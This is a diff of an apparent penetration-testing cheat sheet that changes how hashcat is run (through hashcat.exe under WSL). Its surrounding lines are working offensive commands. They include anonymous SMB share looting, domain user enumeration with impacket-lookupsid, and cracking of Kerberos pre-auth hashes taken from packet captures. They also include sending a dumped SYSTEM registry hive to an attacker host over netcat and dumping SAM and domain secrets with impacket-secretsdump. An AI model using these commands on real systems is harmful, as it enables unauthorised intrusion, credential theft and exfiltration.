@@ -143,7 +143,10 @@ smbme $TARGET
 mkdir smb; smbclient //$TARGET/SHARENAME -N -D . -c 'lcd smb; recurse; prompt; mget *'
 impacket-lookupsid 'anonymous'@$TARGET 10000 -no-pass | cut -d '\' -f 2 | grep 'SidTypeUser' | cut -d ' ' -f 1 | tr '[:upper:]' '[:lower:]'
 tshark -r FILE.pcap -V | grep -iE 'cipher:|enctype:' | cut -d ':' -f2 | xargs -n1
-echo '$krb5pa$18$<CNameString>$<realm>$<cipher>' > hashes; hashcat hashes $rockyou
+echo '$krb5pa$18$<CNameString>$<realm>$<cipher>' > hashes
+cp hashes /mnt/c/hashcat
+cd /mnt/c/hashcat; hashcat.exe -m 19700 hashes $(wslpath -w $rockyou)
+
 
 # Exploitation (Post-creds)
 ## Initial Enumeration
@@ -940,8 +943,7 @@ hashcat -h | grep -A 475 "Hash modes" | grep -i 'descrypt'
 hashcat -h | grep -A 475 "Hash modes" | grep -i 'office'
 hashcat -h | grep -A 475 "Hash modes" | grep -i 'bcrypt'
 
-cd \hashcat && hashcat.exe -m 13721 hashes mutated.txt
-cd \hashcat && hashcat.exe -m 13100 hashes rockyou.txt
+cd /mnt/c/hashcat; hashcat.exe -m 19700 hashes $(wslpath -w $rockyou)
 
 0 	MD5
 100	SHA1
@@ -1875,7 +1877,8 @@ cmd /c "nc.exe $MYIP 4444 -w 3 < system"
 nc -lvp 4444 > system
 impacket-secretsdump -sam sam -system system -security security LOCAL
 echo 'Administrator:500:...................' > hashes
-hashcat -m 1000 -a 0 hashes $rockyou
+cp hashes /mnt/c/hashcat
+cd /mnt/c/hashcat; hashcat.exe -m 1000 -a 0 hashes $(wslpath -w $rockyou)
 powershell -c "(Get-WmiObject Win32_ComputerSystem).Domain"
 impacket-secretsdump $DOM/'$USERNAME':'$PASSWORD'@$TARGET
 
